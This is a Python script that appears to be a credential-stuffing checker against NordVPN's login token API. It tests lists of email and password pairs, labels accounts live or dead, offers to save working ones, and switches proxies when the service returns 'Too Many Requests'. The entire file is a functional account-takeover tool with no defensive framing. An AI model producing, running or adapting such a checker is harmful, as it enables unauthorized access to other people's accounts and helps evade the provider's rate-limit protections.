import requests, time
from os import sys

class Main:
    def __init__(self):
        self.url = "https://api.nordvpn.com/v1/users/tokens"
        self.data = {
            'checked': 0,
            'live': 0,
            'dead': 0,
            'use_proxy': False,
            'save_live': False,
            'save_dead': False,
            'proxy_list': [],
        }
        
    def checker(self, email, password):
        if self.data['use_proxy'] == False:
            resp = requests.post(self.url, json={'username': email, 'password': password})
        else:
            try:
                resp = requests.post(self.url, json={'username': email, 'password': password}, proxies={'http': f"http://{self.data['proxy_list'][0]}", 'https': f"http://{self.data['proxy_list'][0]}"})
            except Exception as e:
                self.renewProxy(self.data['proxy_list'][0])
                return {'process': False, 'message': "Error to execute request", 'data': {'email': email, 'password': password}}
        
        
        if 'Too Many Requests' in resp.text:
            if self.data['use_proxy'] != False:
                self.renewProxy(self.data['proxy_list'][0])
            return {'process': False, 'message': 'Too Many Requests', 'data': {'email': email, 'password': password}}
    
        resp_json = resp.json()
    
        if resp_json.get('errors') != None:
            return {'process': False, 'message': resp_json['errors']['message'], 'data': {'email': email, 'password': password}}
        
        elif resp_json.get('user_id') != None:
            if self.data['use_proxy'] == False:
                return {'process': True, 'data': {'email': email, 'password': password, 'expires_at': resp_json['expires_at']}}
            else:
                return {'process': True, 'message': self.data['proxy_list'][0], 'data': {'email': email, 'password': password, 'expires_at': resp_json['expires_at']}}


        
    def read(self, filename):
        output = []
        with open(filename, 'rb') as file:
            for i in file.readlines():
                output.append(i.decode().replace('\n', '').replace('\r', ''))
            file.close()
        return output
    
    def renewProxy(self, proxy):
        proxy_list = self.data['proxy_list']
        try:
            proxy_list.remove(proxy)
            return {'process': True}
        except Exception as error:
            return {'process': False, 'message': error} 
    
    def getData(self):
        return self.data    
        
    def use_proxy(self):
        resp = input("=>> Use proxy? [Y/n]:  ") 
        if resp.lower() == 'y':self.data['use_proxy'] = True
        elif resp.upper() == 'N':self.data['use_proxy'] = False
        else:
            print("\033[91m[!!] Invalid option\033[00m")
            sys.exit()
        time.sleep(2)
        
    def save_live(self):
        resp = input("=>> Save live accounts? [Y/n]:  ")
        if resp.lower() == 'y':self.data['save_live'] = True
        elif resp.upper() == 'N':self.data['save_live'] = False
        else:
            print("\033[91m[!!] Invalid option\033[00m")
            sys.exit()
        time.sleep(2)
        
    def save_dead(self):
        resp = input("=>> Save dead accounts? [Y/n]:  ")
        if resp.lower() == 'y':self.data['save_dead'] = True
        elif resp.upper() == 'N':self.data['save_dead'] = False
        else:
            print("\033[91m[!!] Invalid option\033[00m")
            sys.exit()
        time.sleep(2)